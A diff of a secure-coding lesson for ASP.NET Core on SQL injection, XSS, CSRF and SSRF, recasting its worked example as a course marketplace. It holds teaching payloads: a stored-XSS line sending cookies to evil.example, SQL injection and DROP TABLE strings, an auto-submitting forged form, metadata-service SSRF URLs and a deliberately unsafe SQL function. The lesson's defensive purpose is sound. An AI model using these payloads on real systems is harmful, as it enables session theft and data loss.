@@ -66,7 +66,7 @@ Every system has **interpreters**: things that read text and act on it. The SQL 
 2. Code glues it into a string meant for an interpreter.
 3. The interpreter can't tell your intended structure from the attacker's structure.
 
-The general fix is also the same: **keep code and data in separate channels**. Parameters for SQL, encoding for HTML, argument arrays instead of shell strings. Validation ("this must be a 10-character PAN") is a useful second layer, but it is not the main defence, because many legitimate values contain dangerous characters. *O'Brien* is a real surname, and `<` is common in engineering notes ("deflection < 5 mm").
+The general fix is also the same: **keep code and data in separate channels**. Parameters for SQL, encoding for HTML, argument arrays instead of shell strings. Validation ("this must be a 10-character PAN") is a useful second layer, but it is not the main defence, because many legitimate values contain dangerous characters. *O'Brien* is a real surname, and `<` is common in a maths or coding course review ("explains why x < 5 fails").
 
 ### SQL injection
 
@@ -74,20 +74,20 @@ Vulnerable code:
 
 ```csharp
 // DON'T: user input concatenated into SQL
-var sql = $"SELECT id, name FROM projects WHERE state = '{state}' ORDER BY {sort}";
+var sql = $"SELECT id, name FROM courses WHERE category = '{category}' ORDER BY {sort}";
 ```
 
-With `state = "x' OR '1'='1"`, the query returns every project. With `state = "x'; DROP TABLE projects; --"`, some drivers that allow multiple statements will run the `DROP`. With a `UNION SELECT` an attacker can read any table the database account can read, including password hashes. That is why [least privilege](#/lesson/m14-least-privilege-audit) for the app's database account matters even after you fix the code.
+With `category = "x' OR '1'='1"`, the query returns every course. With `category = "x'; DROP TABLE courses; --"`, some drivers that allow multiple statements will run the `DROP`. With a `UNION SELECT` an attacker can read any table the database account can read, including password hashes. That is why [least privilege](#/lesson/m14-least-privilege-audit) for the app's database account matters even after you fix the code.
 
 The fix is a **parameterized query**. The SQL text is fixed, and values travel separately in the protocol. PostgreSQL's extended query protocol sends the statement and the parameter values as different messages, so a value can never become syntax:
 
 ```csharp
 await using var cmd = dataSource.CreateCommand(
-    "SELECT id, name FROM projects WHERE state = @state ORDER BY name");
-cmd.Parameters.Add(new NpgsqlParameter("state", state));
+    "SELECT id, name FROM courses WHERE category = @category ORDER BY name");
+cmd.Parameters.Add(new NpgsqlParameter("category", category));
 ```
 
-In EF Core, LINQ queries are parameterized automatically. `FromSql($"... {state}")` and `FromSqlInterpolated` turn the interpolation holes into parameters. `FromSqlRaw` with string concatenation does not: that is where EF Core injection bugs come from. Dapper parameterizes anonymous-object values (`new { state }`).
+In EF Core, LINQ queries are parameterized automatically. `FromSql($"... {category}")` and `FromSqlInterpolated` turn the interpolation holes into parameters. `FromSqlRaw` with string concatenation does not: that is where EF Core injection bugs come from. Dapper parameterizes anonymous-object values (`new { category }`).
 
 **What parameters cannot do.** A parameter can stand only where a *value* goes. It can't be a column name, a table name, a sort direction, or a keyword. For those, use an **allow-list**: map the user's choice to a fixed SQL fragment you wrote.
 
@@ -95,7 +95,7 @@ In EF Core, LINQ queries are parameterized automatically. `FromSql($"... {state}
 var orderBy = sort switch
 {
     "name_asc"    => "name ASC, id ASC",
-    "budget_desc" => "budget_inr DESC, id ASC",
+    "fee_desc" => "fee_inr DESC, id ASC",
     _ => throw new ArgumentException("Unsupported sort.")
 };
 ```
@@ -110,7 +110,7 @@ var orderBy = sort switch
 
 XSS is injection into the browser. The attacker gets their script to run on *your* origin, so it can read the page, call your APIs with the user's session, and change what the user sees.
 
-- **Stored XSS**: a site engineer posts a comment `<img src=x onerror="fetch('https://evil.example/c?'+document.cookie)">`. Every reviewer who opens the inspection report runs it.
+- **Stored XSS**: a learner posts a course review `<img src=x onerror="fetch('https://evil.example/c?'+document.cookie)">`. Every student who opens the course page runs it.
 - **Reflected XSS**: a search page prints `You searched for: {q}` from the query string. The attacker emails a link with a script in `q`.
 - **DOM-based XSS**: client-side code does `element.innerHTML = location.hash.slice(1)`. The server never sees the payload.
 
@@ -135,19 +135,19 @@ Razor, Blazor and React all encode by default. XSS appears where you opt out: `@
 Browsers attach cookies to every request to a site, no matter which site *started* the request. If you are logged in to `portal.example.in` with a cookie, a page on `evil.example` can contain:
 
 ```html
-<form action="https://portal.example.in/projects/42/archive" method="post">
-  <input type="hidden" name="reason" value="duplicate">
+<form action="https://portal.example.in/courses/42/unpublish" method="post">
+  <input type="hidden" name="reason" value="outdated">
 </form>
 <script>document.forms[0].submit()</script>
 ```
 
-Your browser sends the POST *with your cookie*. The server sees a valid session and archives the project. The attacker can't read the response, but they don't need to: the damage is the side effect.
+Your browser sends the POST *with your cookie*. The server sees a valid session and unpublishes the course. The attacker can't read the response, but they don't need to: the damage is the side effect.
 
 Defences:
 
-1. **Antiforgery tokens (synchronizer token pattern).** The server issues a secret token tied to the user's session. Every state-changing request must include it in a form field or header. The attacker's page can't read it (same-origin policy), so it can't forge a valid request. ASP.NET Core does this automatically for Razor Pages and MVC forms, and for minimal API endpoints that bind `[FromForm]` once you call `app.UseAntiforgery()` (.NET 8+). For JSON endpoints called from your own JavaScript with cookie auth, send the token in a header and validate it with `IAntiforgery.ValidateRequestAsync`.
-2. **`SameSite` cookies.** `SameSite=Lax` (the default in modern browsers for cookies without the attribute) stops cookies on cross-site POSTs. `Strict` also stops them on cross-site top-level navigations. They are a strong second layer, but not a complete one: "same-site" includes sibling subdomains, so a compromised `blog.example.in` counts as the same site as `portal.example.in`.
-3. **Never change state on GET.** `GET /projects/42/delete` can be triggered by an `<img>` tag, and `SameSite=Lax` *allows* cookies on top-level GET navigations.
+1. **Antiforgery tokens (synchronizer token pattern).** The server issues a secret token tied to the user's session. Every state-changing request must include it in a form field or header. The attacker's page can't read it (same-origin policy), so it can't forge a valid request. In ASP.NET Core, form tag helpers emit the token automatically. Razor Pages validate it automatically; MVC controllers validate it when you add `[ValidateAntiForgeryToken]` or register `AutoValidateAntiforgeryTokenAttribute` as a global filter; minimal API endpoints that bind form data (`[FromForm]`, `IFormFile`) are validated once you call `app.UseAntiforgery()` (.NET 8+). (ASP.NET Core ties the token to an antiforgery cookie and the signed-in user rather than to server-side session state.) For JSON endpoints called from your own JavaScript with cookie auth, send the token in a header and validate it with `IAntiforgery.ValidateRequestAsync`.
+2. **`SameSite` cookies.** `SameSite=Lax` stops cookies on cross-site POSTs. Chromium-based browsers treat a cookie without the attribute as `Lax`, but not every browser does, so always set it explicitly (ASP.NET Core's cookie authentication handler uses `Lax` by default). `Strict` also stops them on cross-site top-level navigations. They are a strong second layer, but not a complete one: "same-site" includes sibling subdomains, so a compromised `blog.example.in` counts as the same site as `portal.example.in`.
+3. **Never change state on GET.** `GET /courses/42/delete` can be triggered by an `<img>` tag, and `SameSite=Lax` *allows* cookies on top-level GET navigations.
 
 **When CSRF doesn't apply.** APIs authenticated with a bearer token in the `Authorization` header are not CSRF-prone, because the browser never attaches that header automatically. That is why a SPA calling an API with tokens doesn't need antiforgery, but a SPA using cookie auth (including the backend-for-frontend pattern) does.
 
@@ -155,7 +155,7 @@ Defences:
 
 ### Server-side request forgery (SSRF)
 
-Any feature where *your server* fetches a URL that a user supplied is a candidate: webhook registration, "import drawing from URL", link previews, PDF rendering of user HTML, image proxies. The attacker supplies a URL that points somewhere only your server can reach:
+Any feature where *your server* fetches a URL that a user supplied is a candidate: webhook registration, "import profile photo from URL", link previews, PDF rendering of user HTML, image proxies. The attacker supplies a URL that points somewhere only your server can reach:
 
 - `http://169.254.169.254/...`: the cloud instance metadata service, which on many platforms returns credentials for the machine's identity.
 - `http://10.0.4.12:9200/_cat/indices`: an internal Elasticsearch with no authentication "because it is internal".
@@ -174,7 +174,7 @@ Why simple checks fail:
 The robust design:
 
 1. **Allow-list destinations** where you can: "webhooks must be HTTPS on port 443 to hosts the customer verified". An allow-list beats any block-list.
-2. **Validate the IP you actually connect to**, inside the connection step (`SocketsHttpHandler.ConnectCallback`), so the check and the connection use the same DNS answer. Reject private, loopback, link-local, carrier-grade NAT and multicast ranges, including IPv4-mapped IPv6 forms.
+2. **Validate the IP you actually connect to**, inside the connection step (`SocketsHttpHandler.ConnectCallback`), so the check and the connection use the same DNS answer. Reject private, loopback, link-local, carrier-grade NAT and multicast ranges, including IPv4-mapped IPv6 forms. Also turn off proxy use for this client (`UseProxy = false`): with a proxy, `ConnectCallback` checks the proxy's address, not the destination's. Translation prefixes such as NAT64 (`64:ff9b::/96`) can also wrap an internal IPv4 address, which is one more reason the egress firewall is the last line, not the code alone.
 3. **Disable automatic redirects**, or re-validate each hop.
 4. **Network egress controls**: run URL-fetching workers in a subnet whose firewall only allows outbound internet traffic, never internal ranges. Require token-protected metadata access (for example IMDSv2 on AWS, or the `Metadata: true` header that Azure IMDS requires) and give the machine identity the least privilege.
 5. **Limit what comes back**: timeouts, maximum response size, and never echo raw responses to the user.
@@ -228,16 +228,16 @@ sequenceDiagram
     participant V as Victim browser
     participant E as evil.example
     participant P as portal.example.in
-    V->>P: GET /projects/42 with session cookie
+    V->>P: GET /courses/42 with session cookie
     P-->>V: HTML form with hidden antiforgery token T
     V->>E: Visit attacker page in another tab
-    E-->>V: Auto-submitting form to portal POST /projects/42/archive
-    V->>P: POST /projects/42/archive with session cookie, no token
+    E-->>V: Auto-submitting form to portal POST /courses/42/unpublish
+    V->>P: POST /courses/42/unpublish with session cookie, no token
     P->>P: Antiforgery validation fails
-    P-->>V: 400 Bad Request, nothing archived
-    V->>P: Real click: POST /projects/42/archive with cookie and token T
+    P-->>V: 400 Bad Request, nothing unpublished
+    V->>P: Real click: POST /courses/42/unpublish with cookie and token T
     P->>P: Token matches cookie token and user
-    P-->>V: 303 See Other, project archived
+    P-->>V: 303 See Other, course unpublished
 ```
 
 The forged request carries the session cookie because the browser attaches it automatically (assuming `SameSite=None`, or an older browser). What it cannot carry is the token: `evil.example` can't read the portal's HTML, because the same-origin policy blocks it. The real request from the portal's own page includes `T`, which ASP.NET Core checks against the antiforgery cookie and the signed-in user. With `SameSite=Lax` the forged POST wouldn't even carry the session cookie. That's the second layer.
@@ -264,28 +264,28 @@ The URL passed the first checks, because it is HTTPS on port 443. The attacker c
 
 ## Step-by-step example
 
-**Scenario.** A project-monitoring portal for a state highways department has four features that a security review flagged:
+**Scenario.** An online-course marketplace (a site where you buy a ₹4,999 Python course from an independent instructor or a partner institute) has four features that a security review flagged:
 
-1. A project search with free-text name, state filter and sortable columns.
-2. Inspection comments shown on the project page.
-3. An "Archive project" button.
-4. Webhook notifications to contractors' own systems when a milestone is approved.
+1. A course search with free-text name, category filter and sortable columns.
+2. Student reviews shown on the course page.
+3. An "Unpublish course" button for instructors.
+4. Webhook notifications to partner institutes' own systems when a student's enrolment is confirmed.
 
 ### Step 1 — search: parameters plus allow-list
 
-The original code built the SQL with string interpolation, including `ORDER BY {sort}`. We change the values to parameters, map `sort` through an allow-list, and escape `LIKE` wildcards. A request with `sort=budget_inr;DROP TABLE projects` now gets a `400`, and `name=%` searches for a literal percent sign.
+The original code built the SQL with string interpolation, including `ORDER BY {sort}`. We change the values to parameters, map `sort` through an allow-list, and escape `LIKE` wildcards. A request with `sort=fee_inr;DROP TABLE courses` now gets a `400`, and `name=%` searches for a literal percent sign.
 
-### Step 2 — comments: encode, then add CSP
+### Step 2 — reviews: encode, then add CSP
 
-Comments were rendered with `@Html.Raw(comment.Body)` "so line breaks show". We render them with normal `@comment.Body` and CSS `white-space: pre-line` instead. We add a CSP header with `script-src 'self'` and move the two inline `<script>` blocks into files. To find any missed spots, we deploy CSP in `Content-Security-Policy-Report-Only` mode for a week and read the violation reports first.
+Reviews were rendered with `@Html.Raw(review.Body)` "so line breaks show". We render them with normal `@review.Body` and CSS `white-space: pre-line` instead. We add a CSP header with `script-src 'self'` and move the two inline `<script>` blocks into files. To find any missed spots, we deploy CSP in `Content-Security-Policy-Report-Only` mode for a week and read the violation reports first.
 
-### Step 3 — archive: POST with antiforgery
+### Step 3 — unpublish: POST with antiforgery
 
-The archive button was a link: `GET /projects/42/archive`. We change it to a form POST, which Razor Pages protects with an antiforgery token automatically. The session cookie gets `SameSite=Lax`, `HttpOnly` and `Secure`.
+The unpublish button was a link: `GET /courses/42/unpublish`. We change it to a form POST, which Razor Pages protects with an antiforgery token automatically. The session cookie gets `SameSite=Lax`, `HttpOnly` and `Secure`.
 
 ### Step 4 — webhooks: an SSRF-safe client
 
-Webhook URLs must be `https`, port 443, and on a domain the contractor verified (we send a challenge to `/.well-known/` on that domain once). Deliveries use a named `HttpClient` whose handler checks every connected IP and never follows redirects. The delivery workers run in a subnet whose firewall allows only outbound 443 to the internet.
+Webhook URLs must be `https`, port 443, and on a domain the institute verified (we send a challenge to `/.well-known/` on that domain once). Deliveries use a named `HttpClient` whose handler checks every connected IP and never follows redirects. The delivery workers run in a subnet whose firewall allows only outbound 443 to the internet.
 
 ### Step 5 — prevent regressions
 
@@ -300,7 +300,7 @@ Webhook URLs must be `https`, port 443, and on a domain the contractor verified 
 ```text
 Portal.Api/
   Program.cs
-  Data/ProjectRepository.cs
+  Data/CourseRepository.cs
   Web/SecurityHeadersMiddleware.cs
   Web/CommentRenderer.cs
   Web/AntiforgeryFilter.cs
@@ -309,20 +309,20 @@ Portal.Api/
   Outbound/WebhookSender.cs
 ```
 
-```csharp file=Data/ProjectRepository.cs
+```csharp file=Data/CourseRepository.cs
 using System.Data.Common;
 
 namespace Portal.Api.Data;
 
-public sealed record ProjectSearch(string? NameContains, string? State, string Sort = "name_asc", int Page = 1, int PageSize = 20);
-public sealed record ProjectRow(long Id, string Name, string State, long BudgetInr);
+public sealed record CourseSearch(string? NameContains, string? Category, string Sort = "name_asc", int Page = 1, int PageSize = 20);
+public sealed record CourseRow(long Id, string Name, string Category, long FeeInr);
 
 public static class SqlSafety
 {
     private static readonly Dictionary<string, string> Sorts = new(StringComparer.OrdinalIgnoreCase)
     {
         ["name_asc"] = "name ASC, id ASC",
-        ["budget_desc"] = "budget_inr DESC, id ASC",
+        ["fee_desc"] = "fee_inr DESC, id ASC",
         ["created_desc"] = "created_at DESC, id DESC",
     };
 
@@ -336,9 +336,9 @@ public static class SqlSafety
 }
 
 /// <summary>Works with any ADO.NET provider. In production the DbDataSource is an NpgsqlDataSource.</summary>
-public sealed class ProjectRepository(DbDataSource dataSource)
+public sealed class CourseRepository(DbDataSource dataSource)
 {
-    public async Task<IReadOnlyList<ProjectRow>> SearchAsync(ProjectSearch s, CancellationToken ct)
+    public async Task<IReadOnlyList<CourseRow>> SearchAsync(CourseSearch s, CancellationToken ct)
     {
         if (s.PageSize is < 1 or > 100) throw new ArgumentOutOfRangeException(nameof(s), "PageSize must be 1-100.");
         await using var cmd = dataSource.CreateCommand();
@@ -349,25 +349,25 @@ public sealed class ProjectRepository(DbDataSource dataSource)
             where.Add("name ILIKE @name");
             AddParam(cmd, "name", "%" + SqlSafety.EscapeLike(s.NameContains.Trim()) + "%");
         }
-        if (!string.IsNullOrWhiteSpace(s.State))
+        if (!string.IsNullOrWhiteSpace(s.Category))
         {
-            where.Add("state = @state");
-            AddParam(cmd, "state", s.State);
+            where.Add("category = @category");
+            AddParam(cmd, "category", s.Category);
         }
         AddParam(cmd, "limit", s.PageSize);
         AddParam(cmd, "offset", (Math.Max(s.Page, 1) - 1) * s.PageSize);
 
         // Only fixed text and allow-listed fragments are concatenated. Every user value is a parameter.
         cmd.CommandText =
-            "SELECT id, name, state, budget_inr FROM projects" +
+            "SELECT id, name, category, fee_inr FROM courses" +
             (where.Count > 0 ? " WHERE " + string.Join(" AND ", where) : "") +
             " ORDER BY " + SqlSafety.OrderBy(s.Sort) +
             " LIMIT @limit OFFSET @offset";
 
-        var rows = new List<ProjectRow>();
+        var rows = new List<CourseRow>();
         await using var reader = await cmd.ExecuteReaderAsync(ct);
         while (await reader.ReadAsync(ct))
-            rows.Add(new ProjectRow(reader.GetInt64(0), reader.GetString(1), reader.GetString(2), reader.GetInt64(3)));
+            rows.Add(new CourseRow(reader.GetInt64(0), reader.GetString(1), reader.GetString(2), reader.GetInt64(3)));
         return rows;
     }
 
@@ -412,12 +412,12 @@ using System.Text.Encodings.Web;
 
 namespace Portal.Api.Web;
 
-public sealed record InspectionComment(string Author, string Body, DateTimeOffset PostedAt);
+public sealed record ReviewComment(string Author, string Body, DateTimeOffset PostedAt);
 
 /// <summary>Builds an HTML fragment for server-rendered pages outside Razor. Every value is encoded for its context.</summary>
 public sealed class CommentRenderer(HtmlEncoder html, UrlEncoder url)
 {
-    public string Render(IEnumerable<InspectionComment> comments)
+    public string Render(IEnumerable<ReviewComment> comments)
     {
         var sb = new StringBuilder("<ul class=\"comments\">");
         foreach (var c in comments)
@@ -468,7 +468,7 @@ namespace Portal.Api.Outbound;
 
 public sealed class OutboundOptions
 {
-    /// <summary>Exact hosts or ".suffix" entries (".contractor.example" allows any subdomain).</summary>
+    /// <summary>Exact hosts or ".suffix" entries (".institute.example" allows any subdomain).</summary>
     public List<string> AllowedHosts { get; set; } = [];
 }
 
@@ -517,6 +517,7 @@ public static class SsrfSafeHandler
     public static SocketsHttpHandler Create() => new()
     {
         AllowAutoRedirect = false,
+        UseProxy = false,                 // otherwise ConnectCallback would check the proxy, not the destination
         ConnectTimeout = TimeSpan.FromSeconds(5),
         PooledConnectionLifetime = TimeSpan.FromMinutes(2),
         ConnectCallback = async (context, ct) =>
@@ -547,13 +548,13 @@ using Microsoft.Extensions.Logging;
 
 namespace Portal.Api.Outbound;
 
-public sealed record MilestoneApproved(long ProjectId, string Milestone, DateTimeOffset ApprovedAt);
+public sealed record EnrolmentConfirmed(long CourseId, long EnrolmentId, DateTimeOffset ConfirmedAt);
 
 public sealed class WebhookSender(IHttpClientFactory factory, OutboundUrlPolicy policy, ILogger<WebhookSender> log)
 {
     public const string ClientName = "webhooks";
 
-    public async Task<bool> SendAsync(Uri destination, MilestoneApproved evt, CancellationToken ct)
+    public async Task<bool> SendAsync(Uri destination, EnrolmentConfirmed evt, CancellationToken ct)
     {
         if (policy.CheckUrl(destination) is { } reason)
         {
@@ -598,7 +599,7 @@ builder.Services.AddAuthorization();
 builder.Services.AddAntiforgery(o => o.HeaderName = "X-CSRF-TOKEN");
 
 // Production: builder.Services.AddNpgsqlDataSource(connectionString) registers the DbDataSource (Npgsql package).
-builder.Services.AddScoped<ProjectRepository>();
+builder.Services.AddScoped<CourseRepository>();
 builder.Services.AddSingleton(System.Text.Encodings.Web.HtmlEncoder.Default);
 builder.Services.AddSingleton(System.Text.Encodings.Web.UrlEncoder.Default);
 builder.Services.AddSingleton<CommentRenderer>();
@@ -616,7 +617,7 @@ app.UseAuthentication();
 app.UseAuthorization();
 app.UseAntiforgery();   // validates [FromForm] endpoints automatically
 
-app.MapGet("/api/projects", async ([AsParameters] ProjectSearch search, ProjectRepository repo, CancellationToken ct) =>
+app.MapGet("/api/courses", async ([AsParameters] CourseSearch search, CourseRepository repo, CancellationToken ct) =>
 {
     try { return Results.Ok(await repo.SearchAsync(search, ct)); }
     catch (ArgumentException ex) { return Results.Problem(ex.Message, statusCode: StatusCodes.Status400BadRequest); }
@@ -626,11 +627,11 @@ app.MapGet("/api/antiforgery", (IAntiforgery af, HttpContext ctx) =>
     Results.Ok(new { token = af.GetAndStoreTokens(ctx).RequestToken })).RequireAuthorization();
 
 // HTML form post: token checked by UseAntiforgery because the endpoint binds [FromForm].
-app.MapPost("/projects/{id:long}/archive", (long id, [FromForm] string reason) =>
-    Results.Redirect($"/projects/{id}")).RequireAuthorization();
+app.MapPost("/courses/{id:long}/unpublish", (long id, [FromForm] string reason) =>
+    Results.Redirect($"/courses/{id}")).RequireAuthorization();
 
 // JSON endpoint with cookie auth: token must come in the X-CSRF-TOKEN header.
-app.MapPost("/api/projects/{id:long}/milestones/{name}/approve", (long id, string name) => Results.NoContent())
+app.MapPost("/api/courses/{id:long}/enrolments/{enrolmentId:long}/confirm", (long id, long enrolmentId) => Results.NoContent())
    .AddEndpointFilter<AntiforgeryFilter>()
    .RequireAuthorization();
 
@@ -661,39 +662,39 @@ A web application firewall (WAF) blocks many known payloads and buys time during
 :::
 
 :::callout type=tradeoff title="Validation is still worth doing"
-Allow-list validation of *shape* (a PAN is `[A-Z]{5}[0-9]{4}[A-Z]`, a page size is 1–100, a state code is one of 36 values) catches bugs and abuse early and gives clear error messages. It just must not be the only line of defence, because free-text fields can't be validated into safety.
+Allow-list validation of *shape* (a PAN is `[A-Z]{5}[0-9]{4}[A-Z]`, a page size is 1–100, a category is one of 12 values) catches bugs and abuse early and gives clear error messages. It just must not be the only line of defence, because free-text fields can't be validated into safety.
 :::
 
 ## Practical playground
 
-The database below has a `projects` table and a deliberately unsafe PL/pgSQL function `find_projects_unsafe(p_sort text, p_term text)` that builds SQL by concatenation. Try:
+The database below has a `courses` table and a deliberately unsafe PL/pgSQL function `find_courses_unsafe(p_sort text, p_term text)` that builds SQL by concatenation. Try:
 
-- `SELECT * FROM find_projects_unsafe('name', 'Bridge');`. This is normal use.
-- `SELECT * FROM find_projects_unsafe('name', $$x' OR true --$$);`. Every row comes back.
-- `SELECT * FROM find_projects_unsafe('(SELECT 1/0)', 'x');`. The sort parameter runs arbitrary SQL.
-- `PREPARE s(text) AS SELECT id, name FROM projects WHERE name ILIKE '%' || $1 || '%'; EXECUTE s($$x' OR true --$$);`. With a parameter, the same input matches nothing.
+- `SELECT * FROM find_courses_unsafe('name', 'Python');`. This is normal use.
+- `SELECT * FROM find_courses_unsafe('name', $$x' OR true --$$);`. Every row comes back.
+- `SELECT * FROM find_courses_unsafe('(SELECT 1/0)', 'x');`. The sort parameter runs arbitrary SQL.
+- `PREPARE s(text) AS SELECT id, name FROM courses WHERE name ILIKE '%' || $1 || '%'; EXECUTE s($$x' OR true --$$);`. With a parameter, the same input matches nothing.
 
 :::playground type=sql title="Injection lab"
 ```sql
-CREATE TABLE projects (
+CREATE TABLE courses (
   id bigint PRIMARY KEY,
   name text NOT NULL,
-  state text NOT NULL,
-  budget_inr bigint NOT NULL,
-  contractor_pan text NOT NULL
+  category text NOT NULL,
+  fee_inr bigint NOT NULL,
+  instructor_pan text NOT NULL
 );
-INSERT INTO projects VALUES
-  (1, 'Bridge over Ghaghara at Ayodhya', 'UP', 4200000000, 'AAACR1234K'),
-  (2, 'NH-27 widening package 4', 'BR', 7800000000, 'AABCT5678L'),
-  (3, 'Ring road bridge, Guwahati', 'AS', 2900000000, 'AAFCS9012M'),
-  (4, 'Smart city drainage phase 2', 'MP', 640000000, 'AAGCP3456N'),
-  (5, 'Rail over-bridge, Nagpur', 'MH', 910000000, 'AAHCQ7890P');
+INSERT INTO courses VALUES
+  (1, 'Python for Data Analysis', 'data', 4999, 'ABCPK1234K'),
+  (2, 'Web APIs with ASP.NET Core', 'programming', 7999, 'BXRPS5678L'),
+  (3, 'Python Basics for School Students', 'programming', 1499, 'CQTPM9012M'),
+  (4, 'Spoken English in 30 Days', 'language', 999, 'DLMPA3456N'),
+  (5, 'Machine Learning with Python', 'data', 9999, 'EKZPN7890P');
 
-CREATE FUNCTION find_projects_unsafe(p_sort text, p_term text)
-RETURNS TABLE (id bigint, name text, state text) LANGUAGE plpgsql AS $fn$
+CREATE FUNCTION find_courses_unsafe(p_sort text, p_term text)
+RETURNS TABLE (id bigint, name text, category text) LANGUAGE plpgsql AS $fn$
 BEGIN
   RETURN QUERY EXECUTE
-    'SELECT id, name, state FROM projects WHERE name ILIKE ''%' || p_term || '%'' ORDER BY ' || p_sort;
+    'SELECT id, name, category FROM courses WHERE name ILIKE ''%' || p_term || '%'' ORDER BY ' || p_sort;
 END
 $fn$;
 ```
@@ -702,16 +703,16 @@ $fn$;
 ## Exercises
 
 :::exercise id=m14-owasp-ex1 difficulty=beginner kind=code title="Build a parameterized search query"
-Implement `ProjectSearchSql.Build`, which returns the SQL text and a parameter dictionary for the project search. No user-supplied value may appear in the SQL text.
+Implement `CourseSearchSql.Build`, which returns the SQL text and a parameter dictionary for the course search. No user-supplied value may appear in the SQL text.
 ::requirements
 - `nameContains` (optional) becomes `name ILIKE @name` with the value `%<escaped text>%`, where `\`, `%` and `_` are escaped with a backslash.
-- `state` (optional) becomes `state = @state`.
-- `sort` must be one of `name_asc` → `name ASC, id ASC` or `budget_desc` → `budget_inr DESC, id ASC`. Anything else throws `ArgumentException`.
-- Text format: `SELECT id, name FROM projects[ WHERE <cond>[ AND <cond>]] ORDER BY <fragment>`.
+- `category` (optional) becomes `category = @category`.
+- `sort` must be one of `name_asc` → `name ASC, id ASC` or `fee_desc` → `fee_inr DESC, id ASC`. Anything else throws `ArgumentException`.
+- Text format: `SELECT id, name FROM courses[ WHERE <cond>[ AND <cond>]] ORDER BY <fragment>`.
 ::acceptance
-- An injection attempt in `nameContains` or `state` never appears in `Text`, only in `Parameters`.
+- An injection attempt in `nameContains` or `category` never appears in `Text`, only in `Parameters`.
 - `nameContains = "50%"` produces the parameter value `%50\%%`.
-- An unknown sort such as `budget_inr; DROP TABLE projects` throws.
+- An unknown sort such as `fee_inr; DROP TABLE courses` throws.
 - No filters means no `WHERE`.
 ::hint
 Separate the two kinds of input: values (go into parameters) and structure (sort key, must come from your own map).
@@ -721,81 +722,81 @@ Build a `List<string>` of conditions and a `Dictionary<string, object>` of param
 Escape the backslash first, then `%` and `_`. Otherwise you double-escape the backslashes you just added.
 ::hint
 ```csharp
-var orderBy = sort switch { "name_asc" => "name ASC, id ASC", "budget_desc" => "budget_inr DESC, id ASC",
+var orderBy = sort switch { "name_asc" => "name ASC, id ASC", "fee_desc" => "fee_inr DESC, id ASC",
     _ => throw new ArgumentException("Unsupported sort", nameof(sort)) };
 ```
 ::starter
-```csharp file=ProjectSearchSql.cs
+```csharp file=CourseSearchSql.cs
 using System;
 using System.Collections.Generic;
 
 public sealed record SqlQuery(string Text, IReadOnlyDictionary<string, object> Parameters);
 
-public static class ProjectSearchSql
+public static class CourseSearchSql
 {
     public static string EscapeLike(string text) => throw new NotImplementedException();
 
-    public static SqlQuery Build(string? nameContains, string? state, string sort) => throw new NotImplementedException();
+    public static SqlQuery Build(string? nameContains, string? category, string sort) => throw new NotImplementedException();
 }
 ```
 ::tests
-```csharp file=ProjectSearchSqlTests.cs
+```csharp file=CourseSearchSqlTests.cs
 using System;
 using Xunit;
 
-public class ProjectSearchSqlTests
+public class CourseSearchSqlTests
 {
     [Fact]
     public void No_filters_means_no_where() =>
-        Assert.Equal("SELECT id, name FROM projects ORDER BY name ASC, id ASC", ProjectSearchSql.Build(null, null, "name_asc").Text);
+        Assert.Equal("SELECT id, name FROM courses ORDER BY name ASC, id ASC", CourseSearchSql.Build(null, null, "name_asc").Text);
 
     [Fact]
     public void Injection_stays_in_parameters()
     {
         var evil = "x' OR '1'='1";
-        var q = ProjectSearchSql.Build(evil, evil, "budget_desc");
+        var q = CourseSearchSql.Build(evil, evil, "fee_desc");
         Assert.DoesNotContain(evil, q.Text);
-        Assert.Equal("SELECT id, name FROM projects WHERE name ILIKE @name AND state = @state ORDER BY budget_inr DESC, id ASC", q.Text);
-        Assert.Equal(evil, q.Parameters["state"]);
+        Assert.Equal("SELECT id, name FROM courses WHERE name ILIKE @name AND category = @category ORDER BY fee_inr DESC, id ASC", q.Text);
+        Assert.Equal(evil, q.Parameters["category"]);
     }
 
     [Fact]
     public void Like_wildcards_are_escaped() =>
-        Assert.Equal("%50\\%%", ProjectSearchSql.Build("50%", null, "name_asc").Parameters["name"]);
+        Assert.Equal("%50\\%%", CourseSearchSql.Build("50%", null, "name_asc").Parameters["name"]);
 
     [Fact]
     public void Backslash_and_underscore_are_escaped() =>
-        Assert.Equal("a\\\\b\\_c", ProjectSearchSql.EscapeLike("a\\b_c"));
+        Assert.Equal("a\\\\b\\_c", CourseSearchSql.EscapeLike("a\\b_c"));
 
     [Fact]
     public void Unknown_sort_throws() =>
-        Assert.Throws<ArgumentException>(() => ProjectSearchSql.Build(null, null, "budget_inr; DROP TABLE projects"));
+        Assert.Throws<ArgumentException>(() => CourseSearchSql.Build(null, null, "fee_inr; DROP TABLE courses"));
 
     [Fact]
     public void Blank_filters_are_ignored() =>
-        Assert.Empty(ProjectSearchSql.Build("  ", "", "name_asc").Parameters);
+        Assert.Empty(CourseSearchSql.Build("  ", "", "name_asc").Parameters);
 }
 ```
 ::solution
 Values go into the dictionary. Structure comes from a `switch` we control.
 
-```csharp file=ProjectSearchSql.cs
+```csharp file=CourseSearchSql.cs
 using System;
 using System.Collections.Generic;
 
 public sealed record SqlQuery(string Text, IReadOnlyDictionary<string, object> Parameters);
 
-public static class ProjectSearchSql
+public static class CourseSearchSql
 {
     public static string EscapeLike(string text) =>
         text.Replace("\\", "\\\\").Replace("%", "\\%").Replace("_", "\\_");
 
-    public static SqlQuery Build(string? nameContains, string? state, string sort)
+    public static SqlQuery Build(string? nameContains, string? category, string sort)
     {
         var orderBy = sort switch
         {
             "name_asc" => "name ASC, id ASC",
-            "budget_desc" => "budget_inr DESC, id ASC",
+            "fee_desc" => "fee_inr DESC, id ASC",
             _ => throw new ArgumentException($"Unsupported sort '{sort}'.", nameof(sort)),
         };
         var conditions = new List<string>();
@@ -805,13 +806,13 @@ public static class ProjectSearchSql
             conditions.Add("name ILIKE @name");
             parameters["name"] = "%" + EscapeLike(nameContains) + "%";
         }
-        if (!string.IsNullOrWhiteSpace(state))
+        if (!string.IsNullOrWhiteSpace(category))
         {
-            conditions.Add("state = @state");
-            parameters["state"] = state;
+            conditions.Add("category = @category");
+            parameters["category"] = category;
         }
         var where = conditions.Count > 0 ? " WHERE " + string.Join(" AND ", conditions) : "";
-        return new SqlQuery($"SELECT id, name FROM projects{where} ORDER BY {orderBy}", parameters);
+        return new SqlQuery($"SELECT id, name FROM courses{where} ORDER BY {orderBy}", parameters);
     }
 }
 ```
@@ -819,19 +820,19 @@ public static class ProjectSearchSql
 The only interpolation into SQL text uses `where` (built from constant strings) and `orderBy` (from the switch). A reviewer can confirm that in seconds.
 ::mistakes
